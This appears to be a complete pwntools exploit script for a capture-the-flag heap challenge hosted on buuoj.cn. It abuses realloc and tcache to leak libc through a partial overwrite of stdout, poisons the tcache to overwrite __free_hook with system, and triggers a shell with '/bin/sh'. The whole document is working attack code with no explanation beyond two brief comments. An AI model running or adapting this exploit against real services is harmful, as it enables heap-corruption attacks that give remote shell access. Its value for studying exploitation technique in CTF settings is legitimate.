from pwn import *
#context.log_level='debug'
context.arch='amd64'
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
one = [0x4f2c5,0x4f322,0x10a38c]
def cmd(c):
	p.sendlineafter(": ",str(c))
def malloc(size,c="A"):
	cmd(1)
	cmd(size)
	p.sendafter(": ",c)
def calloc(size,c='A'):
	cmd(2)
	cmd(size)
	p.sendafter(": ",c)
def realloc(size,c="A"):
	cmd(3)
	cmd(size)
	if size!=0:
		p.sendafter(": ",c)
	else:
		p.readuntil(": ")
def free(idx):
	if idx ==0:
		c="m"
	elif idx==1:
		c='c'
	else:
		c='r'
	cmd(4)
	cmd(c)
#p=process('./pwn')
p=remote("buuoj.cn",28744)
realloc(0x68)
for x in range(7):
	free(2)
realloc(0)
realloc(0x68)
realloc(0x88+0x20)

realloc(0x88)
for x in range(7):
	free(2)
realloc(0)
realloc(0x88)

realloc(0x68,"\x1d\x47")
#gdb.attach(p)
calloc(0x68)
malloc(0x68,'\x00'*0x33+p64(0x1802)+'\x00'*0x19)
p.read(0x80)
base=u64(p.read(8))-(0x7ffff7dd0700-0x7ffff79e4000)
libc.address=base
log.warning(hex(base))
realloc(0x68,p64(0x7ffff7dcfca0-0x7ffff79e4000+base)*2)

realloc(0)
realloc(0x98+0x88)
realloc(0x98)
realloc(0)
realloc(0x88)
free(2)
realloc(0)
realloc(0x98)
realloc(0x98+0x88,'\x00'*0x98+p64(0x91)+p64(libc.sym['__free_hook']-8))
realloc(0)
realloc(0x88)
realloc(0x68)
realloc(0)
realloc(0x88,"/bin/sh\x00"+p64(libc.sym['system']))
#gdb.attach(p)
free(2)

p.interactive()
# set stdou to leak
# free_hook
0x000555555756030
